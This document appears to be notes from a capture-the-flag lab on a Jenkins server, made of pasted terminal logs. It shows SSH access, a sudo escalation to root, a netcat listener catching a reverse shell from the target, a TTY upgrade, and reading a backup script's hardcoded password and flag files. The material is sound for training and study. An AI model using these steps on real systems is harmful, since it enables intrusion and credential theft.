    ED25519 key fingerprint is SHA256:gipK7in2VdzDc30E0Q1tlnmt8dp9LhyZn6iugx9CDMY.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.28.207' (ED25519) to the list of known hosts.
    admin@10.10.28.207's password: 
    Permission denied, please try again.
    admin@10.10.28.207's password: 
    Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Thu Apr  3 03:46:25 PM UTC 2025
    
      System load:  0.7275390625      Processes:             114
      Usage of /:   48.0% of 9.75GB   Users logged in:       0
      Memory usage: 36%               IPv4 address for eth0: 10.10.28.207
      Swap usage:   0%
    
     * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
       just raised the bar for easy, resilient and secure K8s cluster deployment.
    
       https://ubuntu.com/engage/secure-kubernetes-at-the-edge
    
    Expanded Security Maintenance for Applications is not enabled.
    
    41 updates can be applied immediately.
    To see these additional updates run: apt list --upgradable
    
    Enable ESM Apps to receive additional future security updates.
    See https://ubuntu.com/esm or run: sudo pro status
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    
    Last login: Wed Nov 22 19:57:11 2023 from 10.18.65.106
    admin@jenkins:~$ 
    admin@jenkins:~$ ls
    admin@jenkins:~$ pwd
    /home/admin
    admin@jenkins:~$ cd ..
    admin@jenkins:/home$ ls
    admin  tracy
    admin@jenkins:/home$ cd tracy
    -bash: cd: tracy: Permission denied
    admin@jenkins:/home$ cd admin
    admin@jenkins:~$ ls
    admin@jenkins:~$ sudo deluser tracy sudo
    Removing user `tracy' from group `sudo' ...
    Done.
    admin@jenkins:~$ sudo -l -U tracy
    User tracy is not allowed to run sudo on jenkins.
    admin@jenkins:~$ cd /
    admin@jenkins:/$ ls
    bin   etc   lib32   lost+found  opt   run   srv  usr
    boot  home  lib64   media       proc  sbin  sys  var
    dev   lib   libx32  mnt         root  snap  tmp
    admin@jenkins:/$ cd root
    -bash: cd: root: Permission denied
    admin@jenkins:/$ egrep '^PasswordAuthentication|^#Include' /etc/ssh/sshd_config
    admin@jenkins:/$ cd /home/admin
    admin@jenkins:~$ ls
    admin@jenkins:~$ egrep '^PasswordAuthentication|^#Include' /etc/ssh/sshd_config
    admin@jenkins:~$ ls
    admin@jenkins:~$ sudo -l
    Matching Defaults entries for admin on jenkins:    
        env_reset, mail_badpass,                       
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,         
        use_pty                                        
                                                       
    User admin may run the following commands on       
            jenkins:                                   
        (ALL : ALL) ALL                                
        (ALL) NOPASSWD: ALL                            
    admin@jenkins:~$ sudo su                           
    root@jenkins:/home/admin# sl                       
    Command 'sl' not found, but can be installed with: 
    apt install sl                                     
    root@jenkins:/home/admin# ls
    root@jenkins:/home/admin# cd /                     
    root@jenkins:/# ls                                 
    bin   home   libx32      opt   sbin  tmp
    boot  lib    lost+found  proc  snap  usr
    dev   lib32  media       root  srv   var
    etc   lib64  mnt         run   sys
    root@jenkins:/# ls -lah
    total 72K
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 .
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 ..
    lrwxrwxrwx   1 root root    7 Aug 10  2023 bin -> usr/bin                                             
    drwxr-xr-x   4 root root 4.0K Nov 14  2023 boot
    drwxr-xr-x  19 root root 3.9K Apr  3 15:43 dev
    drwxr-xr-x 104 root root 4.0K Apr  3 16:04 etc
    drwxr-xr-x   4 root root 4.0K Nov 15  2023 home
    lrwxrwxrwx   1 root root    7 Aug 10  2023 lib -> usr/lib                                             
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib32 -> usr/lib32
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib64 -> usr/lib64
    lrwxrwxrwx   1 root root   10 Aug 10  2023 libx32 -> usr/libx32
    drwx------   2 root root  16K Aug 29  2023 lost+found                                                 
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 media
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 mnt
    drwxr-xr-x   3 root root 4.0K Nov 15  2023 opt
    dr-xr-xr-x 178 root root    0 Apr  3 15:43 proc
    drwx------   5 root root 4.0K Apr  3 16:22 root
    drwxr-xr-x  28 root root  840 Apr  3 16:13 run
    lrwxrwxrwx   1 root root    8 Aug 10  2023 sbin -> usr/sbin                                           
    drwxr-xr-x   6 root root 4.0K Aug 10  2023 snap
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 srv
    dr-xr-xr-x  13 root root    0 Apr  3 15:43 sys
    drwxrwxrwt  14 root root 4.0K Apr  3 15:49 tmp
    drwxr-xr-x  14 root root 4.0K Aug 10  2023 usr
    drwxr-xr-x  13 root root 4.0K Aug 10  2023 var
    root@jenkins:/# ls -lah
    total 72K
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 .
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 ..
    lrwxrwxrwx   1 root root    7 Aug 10  2023 bin -> usr/bin
    drwxr-xr-x   4 root root 4.0K Nov 14  2023 boot
    drwxr-xr-x  19 root root 3.9K Apr  3 15:43 dev
    drwxr-xr-x 104 root root 4.0K Apr  3 16:04 etc
    drwxr-xr-x   4 root root 4.0K Nov 15  2023 home
    lrwxrwxrwx   1 root root    7 Aug 10  2023 lib -> usr/lib
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib32 -> usr/lib32
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib64 -> usr/lib64
    lrwxrwxrwx   1 root root   10 Aug 10  2023 libx32 -> usr/libx32
    drwx------   2 root root  16K Aug 29  2023 lost+found
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 media
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 mnt
    drwxr-xr-x   3 root root 4.0K Nov 15  2023 opt
    dr-xr-xr-x 178 root root    0 Apr  3 15:43 proc
    drwx------   5 root root 4.0K Apr  3 16:22 root
    drwxr-xr-x  28 root root  840 Apr  3 16:13 run
    lrwxrwxrwx   1 root root    8 Aug 10  2023 sbin -> usr/sbin
    drwxr-xr-x   6 root root 4.0K Aug 10  2023 snap
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 srv
    dr-xr-xr-x  13 root root    0 Apr  3 15:43 sys
    drwxrwxrwt  14 root root 4.0K Apr  3 15:49 tmp
    drwxr-xr-x  14 root root 4.0K Aug 10  2023 usr
    drwxr-xr-x  13 root root 4.0K Aug 10  2023 var
    root@jenkins:/# cd root
    root@jenkins:~# ls
    flag.txt  snap
    root@jenkins:~# cat flag.txt
    ezRo0tW1thoutDiD
    root@jenkins:~# /etc/ssh/sshd_config
    bash: /etc/ssh/sshd_config: Permission denied
    root@jenkins:~# cd ..
    root@jenkins:/# /etc/ssh/sshd_config
    bash: /etc/ssh/sshd_config: Permission denied
    root@jenkins:/# ls/etc/ssh/sshd_config
    bash: ls/etc/ssh/sshd_config: No such file or directory
    root@jenkins:/# ls /etc/ssh/sshd_config
    /etc/ssh/sshd_config
    root@jenkins:/# cd /etc/ssh/sshd_config
    bash: cd: /etc/ssh/sshd_config: Not a directory
    root@jenkins:/# find /etc -name "sshd_config"
    /etc/ssh/sshd_config
    root@jenkins:/# cd /etc
    root@jenkins:/etc# ls
    adduser.conf            issue                python3.10
    alternatives            issue.net            rc0.d
    amazon                  java-11-openjdk      rc1.d
    apparmor                kernel               rc2.d
    apparmor.d              landscape            rc3.d
    apport                  ldap                 rc4.d
    apt                     ld.so.cache          rc5.d
    bash.bashrc             ld.so.conf           rc6.d
    bash_completion         ld.so.conf.d         rc.local
    bash_completion.d       legal                rcS.d
    bindresvport.blacklist  libaudit.conf        resolv.conf
    binfmt.d                libblockdev          rmt
    byobu                   libnl-3              rpc
    ca-certificates         locale.alias         rsyslog.conf
    ca-certificates.conf    locale.gen           rsyslog.d
    cloud                   localtime            screenrc
    console-setup           logcheck             security
    cron.d                  login.defs           selinux
    cron.daily              logrotate.conf       sensors3.conf
    cron.hourly             logrotate.d          sensors.d
    cron.monthly            lsb-release          services
    crontab                 lvm                  shadow
    cron.weekly             machine-id           shadow-
    cryptsetup-initramfs    magic                shells
    crypttab                magic.mime           skel
    dbus-1                  manpath.config       sos
    dconf                   mdadm                ssh
    debconf.conf            mime.types           ssl
    debian_version          mke2fs.conf          subgid
    default                 ModemManager         subgid-
    deluser.conf            modprobe.d           subuid
    depmod.d                modules              subuid-
    dhcp                    modules-load.d       sudo.conf
    dpkg                    mtab                 sudoers
    e2scrub.conf            multipath            sudoers.d
    environment             multipath.conf       sudo_logsrvd.conf
    environment.d           nanorc               sysctl.conf
    ethertypes              needrestart          sysctl.d
    fonts                   netconfig            systemd
    fstab                   netplan              terminfo
    fstab.orig              network              thermald
    fuse.conf               networkd-dispatcher  timezone
    fwupd                   networks             tmpfiles.d
    gai.conf                newt                 ubuntu-advantage
    groff                   nftables.conf        ucf.conf
    group                   nsswitch.conf        udev
    group-                  opt                  udisks2
    grub.d                  os-release           ufw
    gshadow                 overlayroot.conf     update-manager
    gshadow-                PackageKit           update-motd.d
    gss                     pam.conf             update-notifier
    hdparm.conf             pam.d                UPower
    host.conf               passwd               usb_modeswitch.conf
    hostname                passwd-              usb_modeswitch.d
    hosts                   perl                 vim
    hosts.allow             pki                  vmimport.rc.local
    hosts.deny              pm                   vmware-tools
    init                    polkit-1             vtrgb
    init.d                  pollinate            wgetrc
    initramfs-tools         profile              X11
    inputrc                 profile.d            xattr.conf
    iproute2                protocols            xdg
    iscsi                   python3              zsh_command_not_found
    root@jenkins:/etc# cd ssh
    root@jenkins:/etc/ssh# ls
    moduli         ssh_host_dsa_key        ssh_host_ed25519_key.pub
    ssh_config     ssh_host_dsa_key.pub    ssh_host_rsa_key
    ssh_config.d   ssh_host_ecdsa_key      ssh_host_rsa_key.pub
    sshd_config    ssh_host_ecdsa_key.pub  ssh_import_id
    sshd_config.d  ssh_host_ed25519_key
    root@jenkins:/etc/ssh# cat sshd_config
    
    # This is the sshd server system-wide configuration file.  See
    # sshd_config(5) for more information.
    
    # This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
    
    # The strategy used for options in the default sshd_config shipped with
    # OpenSSH is to specify options with their default value where
    # possible, but leave them commented.  Uncommented options override the
    # default value.
    
    Include /etc/ssh/sshd_config.d/*.conf
    
    #Port 22
    #AddressFamily any
    #ListenAddress 0.0.0.0
    #ListenAddress ::
    
    #HostKey /etc/ssh/ssh_host_rsa_key
    #HostKey /etc/ssh/ssh_host_ecdsa_key
    #HostKey /etc/ssh/ssh_host_ed25519_key
    
    # Ciphers and keying
    #RekeyLimit default none
    
    # Logging
    #SyslogFacility AUTH
    #LogLevel INFO
    
    # Authentication:
    
    #LoginGraceTime 2m
    #PermitRootLogin prohibit-password
    #StrictModes yes
    #MaxAuthTries 6
    #MaxSessions 10
    
    #PubkeyAuthentication yes
    
    # Expect .ssh/authorized_keys2 to be disregarded by default in future.
    #AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2
    
    #AuthorizedPrincipalsFile none
    
    #AuthorizedKeysCommand none
    #AuthorizedKeysCommandUser nobody
    
    # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
    #HostbasedAuthentication no
    # Change to yes if you don't trust ~/.ssh/known_hosts for
    # HostbasedAuthentication
    #IgnoreUserKnownHosts no
    # Don't read the user's ~/.rhosts and ~/.shosts files
    #IgnoreRhosts yes
    
    # To disable tunneled clear text passwords, change to no here!
    #PasswordAuthentication yes
    #Ne3d2SecureTh1sSecureSh31l
    #PermitEmptyPasswords no
    
    # Change to yes to enable challenge-response passwords (beware issues with
    # some PAM modules and threads)
    KbdInteractiveAuthentication no
    
    # Kerberos options
    #KerberosAuthentication no
    #KerberosOrLocalPasswd yes
    #KerberosTicketCleanup yes
    #KerberosGetAFSToken no
    
    # GSSAPI options
    #GSSAPIAuthentication no
    #GSSAPICleanupCredentials yes
    #GSSAPIStrictAcceptorCheck yes
    #GSSAPIKeyExchange no
    
    # Set this to 'yes' to enable PAM authentication, account processing,
    # and session processing. If this is enabled, PAM authentication will
    # be allowed through the KbdInteractiveAuthentication and
    # PasswordAuthentication.  Depending on your PAM configuration,
    # PAM authentication via KbdInteractiveAuthentication may bypass
    # the setting of "PermitRootLogin without-password".
    # If you just want the PAM account and session checks to run without
    # PAM authentication, then enable this but set PasswordAuthentication
    # and KbdInteractiveAuthentication to 'no'.
    UsePAM yes
    
    #AllowAgentForwarding yes
    #AllowTcpForwarding yes
    #GatewayPorts no
    X11Forwarding yes
    #X11DisplayOffset 10
    #X11UseLocalhost yes
    #PermitTTY yes
    PrintMotd no
    #PrintLastLog yes
    #TCPKeepAlive yes
    #PermitUserEnvironment no
    #Compression delayed
    #ClientAliveInterval 0
    #ClientAliveCountMax 3
    #UseDNS no
    #PidFile /run/sshd.pid
    #MaxStartups 10:30:100
    #PermitTunnel no
    #ChrootDirectory none
    #VersionAddendum none
    
    # no default banner path
    #Banner none
    
    # Allow client to pass locale environment variables
    AcceptEnv LANG LC_*
    
    # override default of no subsystems
    Subsystem       sftp    /usr/lib/openssh/sftp-server
    
    # Example of overriding settings on a per-user basis
    #Match User anoncvs
    #       X11Forwarding no
    #       AllowTcpForwarding no
    #       PermitTTY no
    #       ForceCommand cvs server
    
    HostKeyAlgorithms = +ssh-rsa
    PubkeyAcceptedAlgorithms = +ssh-rsa
    root@jenkins:/etc/ssh# ls
    moduli         ssh_host_dsa_key        ssh_host_ed25519_key.pub          
    ssh_config     ssh_host_dsa_key.pub    ssh_host_rsa_key                  
    ssh_config.d   ssh_host_ecdsa_key      ssh_host_rsa_key.pub              
    sshd_config    ssh_host_ecdsa_key.pub  ssh_import_id
    sshd_config.d  ssh_host_ed25519_key
    root@jenkins:/etc/ssh# egrep '^PasswordAuthentication|^#Include' /etc/ssh/sshd_config
    root@jenkins:/etc/ssh# egrep '^PasswordAuthentication|^#Include' sshd_config
    root@jenkins:/etc/ssh# egrep '^PasswordAuthentication|^#Include' sshd_config
    root@jenkins:/etc/ssh# grep '^PasswordAuthentication|^#Include' sshd_config
    root@jenkins:/etc/ssh# nano sshd_config
    root@jenkins:/etc/ssh# nano sshd_config
    root@jenkins:/etc/ssh# sudo systemctl restart ssh
    root@jenkins:/etc/ssh# egrep '^PasswordAuthentication|^#Include' /etc/ssh/sshd_config
    #Include /etc/ssh/sshd_config.d/*.conf
    root@jenkins:/etc/ssh# pwd
    /etc/ssh                                                                                
    root@jenkins:/etc/ssh# cd/                                                              
    bash: cd/: No such file or directory                                                    
    root@jenkins:/etc/ssh# cd /
    root@jenkins:/# ls
    bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
    boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
    root@jenkins:/# cd home
    root@jenkins:/home# ls
    admin  tracy
    root@jenkins:/home# nano /etc/ssh/sshd_config
    root@jenkins:/home# sudo systemctl restart ssh
    root@jenkins:/home# cd var/lib/jenkins/
    bash: cd: var/lib/jenkins/: No such file or directory                                   
    root@jenkins:/home# cd ..                                                               
    root@jenkins:/# cd var/lib/jenkins/                                                     
    root@jenkins:/var/lib/jenkins# ls                                                       
    config.xml                                                                              
    config.xml.bak                                                                          
    hudson.model.UpdateCenter.xml                                                           
    hudson.plugins.git.GitTool.xml                                                          
    identity.key.enc                                                                        
    jenkins.install.InstallUtil.lastExecVersion                                             
    jenkins.install.UpgradeWizard.state                                                     
    jenkins.model.JenkinsLocationConfiguration.xml                                          
    jenkins.plugins.git.GitHooksConfiguration.xml                                           
    jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml                             
    jenkins.security.QueueItemAuthenticatorConfiguration.xml                                
    jenkins.security.UpdateSiteWarningsConfiguration.xml                                    
    jenkins.telemetry.Correlator.xml                                                        
    jobs                                                                                    
    logs                                                                                    
    nodeMonitors.xml                                                                        
    nodes                                                                                   
    org.jenkinsci.plugins.gitclient.GitHostKeyVerificationConfiguration.xml
    plugins
    queue.xml.bak
    secret.key
    secret.key.not-so-secret
    secrets
    updates
    userContent
    root@jenkins:/var/lib/jenkins# nano config.xml.bak
    root@jenkins:/var/lib/jenkins# 
    
    ```
    
    ```bash
    ┌──(nei㉿kali)-[~]
    └─$ ip add
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host noprefixroute 
           valid_lft forever preferred_lft forever
    2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
        link/ether d0:bf:9c:65:18:42 brd ff:ff:ff:ff:ff:ff
    3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
        link/ether d8:fc:93:51:b0:5d brd ff:ff:ff:ff:ff:ff
        inet 192.168.1.9/24 brd 192.168.1.255 scope global dynamic noprefixroute wlan0
           valid_lft 315358187sec preferred_lft 315358187sec
        inet6 fe80::dafc:93ff:fe51:b05d/64 scope link noprefixroute 
           valid_lft forever preferred_lft forever
    4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
        link/none 
        inet 10.23.89.97/16 scope global tun0
           valid_lft forever preferred_lft forever
        inet6 fe80::1784:619e:f668:393f/64 scope link stable-privacy proto kernel_ll 
           valid_lft forever preferred_lft forever
                                                         
    ┌──(nei㉿kali)-[~]
    └─$ nc -nvlp 6996
    listening on [any] 6996 ...
    connect to [10.23.89.97] from (UNKNOWN) [10.10.28.207] 58018
    ls
    config.xml
    config.xml.bak
    hudson.model.UpdateCenter.xml
    hudson.plugins.git.GitTool.xml
    identity.key.enc
    jenkins.install.InstallUtil.lastExecVersion
    jenkins.install.UpgradeWizard.state
    jenkins.model.JenkinsLocationConfiguration.xml
    jenkins.plugins.git.GitHooksConfiguration.xml
    jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
    jenkins.security.QueueItemAuthenticatorConfiguration.xml
    jenkins.security.UpdateSiteWarningsConfiguration.xml
    jenkins.telemetry.Correlator.xml
    jobs
    logs
    nodeMonitors.xml
    nodes
    org.jenkinsci.plugins.gitclient.GitHostKeyVerificationConfiguration.xml
    plugins
    queue.xml.bak
    secret.key
    secret.key.not-so-secret
    secrets
    updates
    userContent
    users
    workspace
    ls
    config.xml
    config.xml.bak
    hudson.model.UpdateCenter.xml
    hudson.plugins.git.GitTool.xml
    identity.key.enc
    jenkins.install.InstallUtil.lastExecVersion
    jenkins.install.UpgradeWizard.state
    jenkins.model.JenkinsLocationConfiguration.xml
    jenkins.plugins.git.GitHooksConfiguration.xml
    jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
    jenkins.security.QueueItemAuthenticatorConfiguration.xml
    jenkins.security.UpdateSiteWarningsConfiguration.xml
    jenkins.telemetry.Correlator.xml
    jobs
    logs
    nodeMonitors.xml
    nodes
    org.jenkinsci.plugins.gitclient.GitHostKeyVerificationConfiguration.xml
    plugins
    queue.xml.bak
    secret.key
    secret.key.not-so-secret
    secrets
    updates
    userContent
    users
    workspace
    cd users
    ls
    admin_17026156214276373646
    infraadmin_228839177270308121
    users.xml
    python -c 'import pty; pty.spawn("/bin/bash")'
    /bin/bash: line 5: python: command not found
    
    script /dev/null -c bash
    Script started, output log file is '/dev/null'.
    jenkins@jenkins:~/users$ ls
    ls
    admin_17026156214276373646  infraadmin_228839177270308121  users.xml
    jenkins@jenkins:~/users$ cat users.xml
    cat users.xml
    <?xml version='1.1' encoding='UTF-8'?>
    <hudson.model.UserIdMapper>
      <version>1</version>
      <idToDirectoryNameMap class="concurrent-hash-map">
        <entry>
          <string>infra_admin</string>
          <string>infraadmin_228839177270308121</string>
        </entry>
        <entry>
          <string>admin</string>
          <string>admin_17026156214276373646</string>
        </entry>
      </idToDirectoryNameMap>
    </hudson.model.UserIdMapper>jenkins@jenkins:~/users$ cd ..
    cd ..
    jenkins@jenkins:~$ pwd
    pwd
    /var/lib/jenkins
    jenkins@jenkins:~$ sudo deluser tracy sudo
    sudo deluser tracy sudo
    [sudo] password for jenkins: 
    
    Sorry, try again.
    [sudo] password for jenkins: 
    
    Sorry, try again.
    [sudo] password for jenkins: 
    
    sudo: 3 incorrect password attempts
    jenkins@jenkins:~$ cd /opt
    cd /opt
    jenkins@jenkins:/opt$ ls
    ls
    scripts
    jenkins@jenkins:/opt$ cd /scripts
    cd /scripts
    bash: cd: /scripts: No such file or directory
    jenkins@jenkins:/opt$ cd /scripts
    cd /scripts
    bash: cd: /scripts: No such file or directory
    jenkins@jenkins:/opt$ cd scripts
    cd scripts
    jenkins@jenkins:/opt/scripts$ ls
    ls
    backup.sh
    jenkins@jenkins:/opt/scripts$ cat back.sh
    cat back.sh
    cat: back.sh: No such file or directory
    jenkins@jenkins:/opt/scripts$ cat backup.sh
    cat backup.sh
    #!/bin/sh
    
    mkdir /var/lib/jenkins/backup
    mkdir /var/lib/jenkins/backup/jobs /var/lib/jenkins/backup/nodes /var/lib/jenkins/backup/plugins /var/lib/jenkins/backup/secrets /var/lib/jenkins/backup/users
    
    cp /var/lib/jenkins/*.xml /var/lib/jenkins/backup/
    cp -r /var/lib/jenkins/jobs/ /var/lib/jenkins/backup/jobs/
    cp -r /var/lib/jenkins/nodes/ /var/lib/jenkins/backup/nodes/
    cp /var/lib/jenkins/plugins/*.jpi /var/lib/jenkins/backup/plugins/
    cp /var/lib/jenkins/secrets/* /var/lib/jenkins/backup/secrets/
    cp -r /var/lib/jenkins/users/* /var/lib/jenkins/backup/users/
    
    tar czvf /var/lib/jenkins/backup.tar.gz /var/lib/jenkins/backup/
    /bin/sleep 5
    
    username="tracy"
    password="13_1n_33"
    Ip="localhost"
    sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz $username@$Ip:/home/tracy/backups
    /bin/sleep 10
    
    rm -rf /var/lib/jenkins/backup/
    rm -rf /var/lib/jenkins/backup.tar.gz
    jenkins@jenkins:/opt/scripts$ ls
    ls
    backup.sh
    jenkins@jenkins:/opt/scripts$ ls
    ls                                                                                                                
    backup.sh                                                                                                         
    jenkins@jenkins:/opt/scripts$ cy"                                                                                 
    password="13_1n_33"                                                                                               
    Ip="localhost"                                                                                                    
    sshpass -p "$cy"                                                                                                  
    > password="13_1n_33"                                                                                             
    > Ip="localhost"                                                                                                  
    ls                                                                                                                
    ls                                                                           
    > ls                                                                         
    ls                                                                           
    > l                                                                          
    sl                                                                           
    > ls                                                                         
    sls                                                                          
    > ^C                                                                         
                                                                                 
    ┌──(nei㉿kali)-[~]
    └─$ nc -nvlp 6996
    listening on [any] 6996 ...
    
    ^C
                                                                                 
    ┌──(nei㉿kali)-[~]
    └─$ ls
    Desktop    Downloads  Music     pro     Templates
    Documents  go         Pictures  Public  Videos
                                                                                 
    ┌──(nei㉿kali)-[~]
    └─$ ssh tracy@10.10.28.207
    tracy@10.10.28.207: Permission denied (publickey).
                                                                                 
    ┌──(nei㉿kali)-[~]
    └─$ ssh tracy@10.10.28.207
    tracy@10.10.28.207's password: 
    Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Thu Apr  3 04:41:36 PM UTC 2025
    
      System load:  0.0               Processes:             120
      Usage of /:   48.2% of 9.75GB   Users logged in:       1
      Memory usage: 37%               IPv4 address for eth0: 10.10.28.207
      Swap usage:   0%
    
     * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
       just raised the bar for easy, resilient and secure K8s cluster deployment.
    
       https://ubuntu.com/engage/secure-kubernetes-at-the-edge
    
    Expanded Security Maintenance for Applications is not enabled.
    
    41 updates can be applied immediately.
    To see these additional updates run: apt list --upgradable
    
    Enable ESM Apps to receive additional future security updates.
    See https://ubuntu.com/esm or run: sudo pro status
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
    
    Last login: Thu Apr  3 16:13:19 2025 from 10.23.89.97
    tracy@jenkins:~$ ls
    backups
    tracy@jenkins:~$ sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz trtracy@jenkins:~$ sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz trtracy@jenkins:~$ sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz tracy@10.10.28.207:/home/tracy/backups
    Host key verification failed.
    tracy@jenkins:~$ 
    
    ```
    
- root flag
    
    ```bashbash
    root@jenkins:/# ls -lah
    total 72K
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 .
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 ..
    lrwxrwxrwx   1 root root    7 Aug 10  2023 bin -> usr/bin                                             
    drwxr-xr-x   4 root root 4.0K Nov 14  2023 boot
    drwxr-xr-x  19 root root 3.9K Apr  3 15:43 dev
    drwxr-xr-x 104 root root 4.0K Apr  3 16:04 etc
    drwxr-xr-x   4 root root 4.0K Nov 15  2023 home
    lrwxrwxrwx   1 root root    7 Aug 10  2023 lib -> usr/lib                                             
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib32 -> usr/lib32
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib64 -> usr/lib64
    lrwxrwxrwx   1 root root   10 Aug 10  2023 libx32 -> usr/libx32
    drwx------   2 root root  16K Aug 29  2023 lost+found                                                 
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 media
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 mnt
    drwxr-xr-x   3 root root 4.0K Nov 15  2023 opt
    dr-xr-xr-x 178 root root    0 Apr  3 15:43 proc
    drwx------   5 root root 4.0K Apr  3 16:22 root
    drwxr-xr-x  28 root root  840 Apr  3 16:13 run
    lrwxrwxrwx   1 root root    8 Aug 10  2023 sbin -> usr/sbin                                           
    drwxr-xr-x   6 root root 4.0K Aug 10  2023 snap
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 srv
    dr-xr-xr-x  13 root root    0 Apr  3 15:43 sys
    drwxrwxrwt  14 root root 4.0K Apr  3 15:49 tmp
    drwxr-xr-x  14 root root 4.0K Aug 10  2023 usr
    drwxr-xr-x  13 root root 4.0K Aug 10  2023 var
    root@jenkins:/# ls -lah
    total 72K
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 .
    drwxr-xr-x  19 root root 4.0K Aug 29  2023 ..
    lrwxrwxrwx   1 root root    7 Aug 10  2023 bin -> usr/bin
    drwxr-xr-x   4 root root 4.0K Nov 14  2023 boot
    drwxr-xr-x  19 root root 3.9K Apr  3 15:43 dev
    drwxr-xr-x 104 root root 4.0K Apr  3 16:04 etc
    drwxr-xr-x   4 root root 4.0K Nov 15  2023 home
    lrwxrwxrwx   1 root root    7 Aug 10  2023 lib -> usr/lib
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib32 -> usr/lib32
    lrwxrwxrwx   1 root root    9 Aug 10  2023 lib64 -> usr/lib64
    lrwxrwxrwx   1 root root   10 Aug 10  2023 libx32 -> usr/libx32
    drwx------   2 root root  16K Aug 29  2023 lost+found
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 media
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 mnt
    drwxr-xr-x   3 root root 4.0K Nov 15  2023 opt
    dr-xr-xr-x 178 root root    0 Apr  3 15:43 proc
    drwx------   5 root root 4.0K Apr  3 16:22 root
    drwxr-xr-x  28 root root  840 Apr  3 16:13 run
    lrwxrwxrwx   1 root root    8 Aug 10  2023 sbin -> usr/sbin
    drwxr-xr-x   6 root root 4.0K Aug 10  2023 snap
    drwxr-xr-x   2 root root 4.0K Aug 10  2023 srv
    dr-xr-xr-x  13 root root    0 Apr  3 15:43 sys
    drwxrwxrwt  14 root root 4.0K Apr  3 15:49 tmp
    drwxr-xr-x  14 root root 4.0K Aug 10  2023 usr
    drwxr-xr-x  13 root root 4.0K Aug 10  2023 var
    root@jenkins:/# cd root
    root@jenkins:~# ls
    flag.txt  snap
    ```
### flag
```bash
root@jenkins:~# cat flag.txt
    ezRo0t***W1thoutDiD
```
    
    
- the ja… flag
    
    ```bash
    NU nano 6.2                         config.xml.bak                                   
    <?xml version='1.1' encoding='UTF-8'?>
    <hudson>
      <disabledAdministrativeMonitors>
        <string>jenkins.diagnostics.ControllerExecutorsNoAgents</string>
      </disabledAdministrativeMonitors>
      <version>2.414.1</version>
      <numExecutors>2</numExecutors>
      <mode>NORMAL</mode>
      <useSecurity>true</useSecurity>
      <!--authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorization>
        <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
      </authorizationStrategy-->
      <!--FullTrust_has_n0_Place1nS3cur1ty-->
      <!--securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
        <disableSignup>true</disableSignup>
        <enableCaptcha>false</enableCaptcha>
      </securityRealm-->
      <disableRememberMe>false</disableRememberMe>
      <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamin>
      <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
      <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
      <jdks/>
      <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
